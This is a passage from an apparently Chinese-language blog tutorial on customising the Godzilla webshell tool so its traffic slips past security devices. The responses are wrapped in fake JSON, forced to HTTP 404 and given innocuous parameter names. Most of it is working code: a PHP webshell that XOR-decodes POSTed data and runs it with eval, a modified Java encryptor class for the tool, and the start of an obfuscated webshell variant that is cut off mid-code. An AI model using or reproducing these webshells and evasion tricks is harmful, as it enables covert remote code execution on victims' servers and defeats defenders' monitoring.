class="line">&#125;</span><br></pre></td></tr></table></figure><p>在代码中，我们可以看到，</p><p>eval($payload);<br>        echo substr(md5($pass.$key),0,16);<br>        echo base64_encode(encode(@run($data),$key));<br>        echo substr(md5($pass.$key),16);</p><p>发送的数据报为输出pass和key的md5值前十六位，数据异或的值，接着输出后十六位</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918140534539.png" alt="image-20240918140534539"></p><p>这是原版的请求流量，也不是原版</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918140635648.png" alt="image-20240918140635648"></p><p>原版是这样的，我们刚刚定死了左右添加数据。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918140727136.png" alt="image-20240918140727136"></p><p>回显包，看到MD5前16  返回值异或 和后16位。</p><p>这里发送的包暂时不改了，因为发送的包改的话需要改发送的payload，返回包改了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141531019.png" alt="image-20240918141531019"></p><p>在返回包的代码中有一个函数，传递了this.findStrLeft, this.findStrRight，也就是上面定义的</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141621610.png" alt="image-20240918141621610"></p><p>md5的前后16位，ctrl+submiddlestr 会发现，就是将左边的数据，加返回的数据，加16位后数据</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141725742.png" alt="image-20240918141725742"></p><p>ok，我们给他变下型，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141914961.png" alt="image-20240918141914961"></p><p>左右追加数据注释掉，然后添加一个返回信息。json格式。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918142315774.png" alt="image-20240918142315774"></p><p>我们的木马中，可以看到是输出的MD5，这样肯定不行，我们给他改一下，改成符合我们的加密方式的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">      <span class="comment">//  echo substr(md5($pass.$key),0,16);</span></span><br><span class="line">       <span class="comment">// echo base64_encode(encode(@run($data),$key));</span></span><br><span class="line">        <span class="comment">//echo substr(md5($pass.$key),16);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918142827258.png" alt="image-20240918142827258"></p><p>好，在看下流量</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143005096.png" alt="image-20240918143005096"></p><p>返回包</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143036780.png" alt="image-20240918143036780"></p><p>嘿，是不是有那味了。</p><p>在php中，我们可以让返回包强制404，只需在🐎里面添加http_response_code(404);即可</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143259838.png" alt="image-20240918143259838"></p><p>顺便我把pass改成了search，这样再看下数据包。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143443763.png" alt="image-20240918143443763"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918144818071.png" alt="image-20240918144818071"></p><p>这样的话，我们的流量状态码就是404了，是不是猛一看，还真不好分辨，如果是新手的话，可能看设备的时候都直接略过点误报了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145047876.png" alt="image-20240918145047876"></p><p>当然，你可以改成任何你喜欢的数字。</p><p>发送包的pass 因为是传递键，所以我建议生成的时候，还是用一些单词，这样更有迷惑性。</p><p>返回值这个fL1tMGI4YTlj有的安全设备，也被定义为危险字符，因为返回值要异或key，所以key在生成的时候也不能用默认，简单改一改。</p><p>ok做戏要做全套，我们不能每次用的时候需要，来到文章拿代码，godzilla也是好用在这里。直接工具中生成，对我这种萌新比较友好。</p><p>接下来，我们来看怎么在godzilla中生成木马。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145447770.png" alt="image-20240918145447770"></p><p>php的generate的代码中确定了用到那个bin文件，</p><p>加密器中也会判断isbin?，那我们仿照eval的加密器写，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145651220.png" alt="image-20240918145651220"></p><p>直接定死或者bin文件即可。</p><p>创建文件，格式对齐。别写错了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145837517.png" alt="image-20240918145837517"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918151810623.png" alt="image-20240918151810623"></p><p>最下面改一改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> shells.cryptions.phpXor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> core.annotation.CryptionAnnotation;</span><br><span class="line"><span class="keyword">import</span> core.imp.Cryption;</span><br><span class="line"><span class="keyword">import</span> core.shell.ShellEntity;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> util.Log;</span><br><span class="line"><span class="keyword">import</span> util.functions;</span><br><span class="line"><span class="keyword">import</span> util.http.Http;</span><br><span class="line"></span><br><span class="line"><span class="meta">@CryptionAnnotation(</span></span><br><span class="line"><span class="meta">        Name = &quot;PHP_XOR_BASE64_MESSAGES&quot;,</span></span><br><span class="line"><span class="meta">        payloadName = &quot;PhpDynamicPayload&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PhpXormessage</span> <span class="keyword">implements</span> <span class="title">Cryption</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ShellEntity shell;</span><br><span class="line">    <span class="keyword">private</span> Http http;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] key;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> state;</span><br><span class="line">    <span class="keyword">private</span> String pass;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] payload;</span><br><span class="line">    <span class="keyword">private</span> String findStrLeft;</span><br><span class="line">    <span class="keyword">private</span> String findStrRight;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PhpXormessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.shell = context;</span><br><span class="line">        <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">        <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX().getBytes();</span><br><span class="line">        <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">        String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">new</span> String(<span class="keyword">this</span>.key));</span><br><span class="line">        <span class="comment">//this.findStrLeft = findStrMd5.substring(0, 16);</span></span><br><span class="line">        <span class="comment">//this.findStrRight = findStrMd5.substring(16);</span></span><br><span class="line">        <span class="keyword">this</span>.findStrLeft = <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.findStrRight = <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.payload = <span class="keyword">this</span>.shell.getPayloadModule().getPayload();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.payload != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.http.sendHttpResponse(<span class="keyword">this</span>.payload);</span><br><span class="line">                <span class="keyword">this</span>.state = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Log.error(<span class="string">&quot;payload Is Null&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">            Exception e = var4;</span><br><span class="line">            Log.error(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.E(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            Exception e = var3;</span><br><span class="line">            Log.error(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data != <span class="keyword">null</span> &amp;&amp; data.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.D(<span class="keyword">this</span>.findStr(data));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">                Exception e = var3;</span><br><span class="line">                Log.error(e);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSendRLData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] E(<span class="keyword">byte</span>[] cs) &#123;</span><br><span class="line">        <span class="keyword">int</span> len = cs.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            cs[i] ^= <span class="keyword">this</span>.key[i + <span class="number">1</span> &amp; <span class="number">15</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] D(String data) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] cs = functions.base64Decode(data);</span><br><span class="line">        <span class="keyword">int</span> len = cs.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            cs[i] ^= <span class="keyword">this</span>.key[i + <span class="number">1</span> &amp; <span class="number">15</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findStr</span><span class="params">(<span class="keyword">byte</span>[] respResult)</span> </span>&#123;</span><br><span class="line">        String htmlString = <span class="keyword">new</span> String(respResult);</span><br><span class="line">        <span class="keyword">return</span> functions.subMiddleStr(htmlString, <span class="keyword">this</span>.findStrLeft, <span class="keyword">this</span>.findStrRight);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.state;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] generate(String password, String secretKey) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> String(functions.readInputStreamAutoClose(PhpXormessage.class.getResourceAsStream(<span class="string">&quot;template/xorbase64message.bin&quot;</span>)))).replace(<span class="string">&quot;&#123;pass&#125;&quot;</span>, password).replace(<span class="string">&quot;&#123;secretKey&#125;&quot;</span>, functions.md5(secretKey).substring(<span class="number">0</span>, <span class="number">16</span>)).getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后bin文件写好</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">http_response_code(<span class="number">404</span>);</span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;&#123;pass&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;&#123;secretKey&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ok打包编译，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918153555125.png" alt="image-20240918153555125"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918153824247.png" alt="image-20240918153824247"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918154134027.png" alt="image-20240918154134027"></p><p>ok，这里演示已经没有问题了，我们直接做全点，</p><p>用一下这个大师傅的项目，<a href="https://github.com/Tas9er/ByPassGodzilla">https://github.com/Tas9er/ByPassGodzilla</a></p><p>生成一个php的码，封装到里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?pHP</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(Chr(<span class="string">&quot;48&quot;</span>));</span><br><span class="line">@error_reporting<span class="comment">/*dbappsecurityCh3yaQPIpr*/</span>(Chr(<span class="string">&quot;48&quot;</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qianxingCgkD21wHn</span>(<span class="params"><span class="comment">/*dbappsecurityN05i2v*/</span><span class="variable">$qianxinfImnkp0WMq6TX</span>,<span class="variable">$qianxinGYCCVkSDkVAY</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$qianxinhP</span>=Chr(<span class="string">&quot;48&quot;</span>);<span class="variable">$qianxinhP</span>&lt;strlen(<span class="variable">$qianxinfImnkp0WMq6TX</span>);<span class="variable">$qianxinhP</span>++) &#123;</span><br><span class="line">        <span class="variable">$qianxinqq</span> = <span class="variable">$qianxinGYCCVkSDkVAY</span>[<span class="variable">$qianxinhP</span>+Chr(<span class="string">&quot;49&quot;</span>)&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$qianxinfImnkp0WMq6TX</span>[<span class="variable">$qianxinhP</span>] = <span class="variable">$qianxinfImnkp0WMq6TX</span>[<span class="variable">$qianxinhP</span>]^<span class="variable">$qianxinqq</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$qianxinfImnkp0WMq6TX</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$qianxinITUfjjXmxo2</span> = <span class="string">&quot;bas&quot;</span>.<span class="string">&quot;e6&quot;</span>.Chr(<span class="string">&quot;52&quot;</span>).<span class="string">&quot;_&quot;</span>.<span class="string">&quot;de&quot;</span>.<span class="string">&quot;cod&quot;</span>.Chr(<span class="string">&quot;101&quot;</span>);</span><br><span class="line"><span class="variable">$base64_qianxingCgkD21wHn</span> = <span class="string">&quot;bas&quot;</span>.<span class="string">&quot;e6&quot;</span>.Chr(<span class="string">&quot;52&quot;</span>).<span class="string">&quot;_e&quot;</span>.Chr(<span class="string">&quot;110&quot;</span>).Chr(<span class="string">&quot;99&quot;</span>).<span class="string">&quot;ode&quot;</span>;</span><br><span class="line"><span class="variable">$qianxinw7hJzkKxyi</span>=<span class="string">&#x27;&#123;pass&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$qianxinuMq5P9IAtT1AwU</span>=<span class="string">&#x27;p&#x27;</span>.<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="string">&quot;WVhsc2IyRms=&quot;</span>));</span><br><span class="line"><span class="variable">$qianxin1B</span>=<span class="string">&#x27;&#123;secretKey&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span><span class="comment">/*dbappsecurityQikjH7TyvFiC5K*/</span>[<span class="variable">$qianxinw7hJzkKxyi</span>]))&#123;</span><br><span class="line">    <span class="variable">$datqianxin7mlwRjVMRy1A</span>=qianxingCgkD21wHn<span class="comment">/*dbappsecurityKdu4owvmY*/</span>(<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="variable">$_POST</span>[<span class="variable">$qianxinw7hJzkKxyi</span>]),<span class="variable">$qianxin1B</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="comment">/*dbappsecuritybmIrEvG*/</span><span 